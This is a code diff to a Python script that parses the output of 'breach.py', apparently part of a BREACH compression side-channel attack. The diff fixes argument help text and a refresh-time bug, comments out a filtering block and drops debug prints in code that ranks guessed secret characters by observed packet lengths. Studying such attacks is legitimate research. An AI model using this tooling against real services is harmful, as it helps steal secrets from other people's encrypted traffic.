@@ -51,8 +51,8 @@ sampling_ratio = 20
 refresh_time = 60
 
 parser = argparse.ArgumentParser(description='Parser of breach.py output')
-parser.add_argument('-a', metavar = 'alphabet', required = True, nargs = '+', help = 'Choose alphabet type  (in that order): n => digits, l => lowercase letters, u => uppercase letters')
-parser.add_argument('-lf', metavar = 'file_num', required = True, type = int, help = 'Input the latest output file breach.py has created, -1 if first try')
+parser.add_argument('-a', metavar = 'alphabet', required = True, nargs = '+', help = 'Choose alphabet type (in that order): n => digits, l => lowercase letters, u => uppercase letters')
+parser.add_argument('-lf', metavar = 'latest_file_number', required = True, type = int, help = 'Input the latest output file breach.py has created, -1 if first try')
 parser.add_argument('-r', metavar = 'request_length', required = True, type = int, help = 'Input the (mean payload) length of the request packet')
 parser.add_argument('-m', metavar = 'mean_length', required = True, type = int, help = 'Input the (observed mean payload) length value of the packet')
 parser.add_argument('-c', metavar = 'correct_value', required = True, help = 'Input the correct value we attack')
@@ -67,7 +67,7 @@ correct_val = args.c
 if args.s:
     sampling_ratio = args.s
 if args.t:
-    refresh_time = args.s
+    refresh_time = args.t
 
 if 'n' in alphabet_type:
     num = True
@@ -99,17 +99,18 @@ while 1:
                 buff = []
                 for line in output_file.readlines():
                     if prev_request % len(combined) == 0:
-                        #print buff
                         for r in buff:
                             f.write(r)
-                            buff = []
+                        buff = []
                     pref, size = line.split(": ")
+                    '''
                     if pref == "User application payload" and int(size) > request_length - 5 and int(size) < request_length + 5:
                             if (curr_request != prev_request):
                                     buff.append("%d: -1\n" % prev_request)
                                     prev_request = prev_request + 1
                             curr_request = curr_request + 1
                             continue
+                    '''
                     if (pref == "Endpoint application payload"):
                         if int(size) > mean_length_large - 10 and int(size) < mean_length_large + 10:
                             summary = int(size)
@@ -147,8 +148,6 @@ while 1:
     combined_sorted = sort_dictionary_values(combined)
     for v,k in combined_sorted:
             result_file.write("%s: %f\n" % (k, v))
-    print alphabet[0]
-    print iterations[alphabet[0]]
     samples[iterations[alphabet[0]]] = combined_sorted
     samples = sort_dictionary(samples)
     result_file.write("\n")
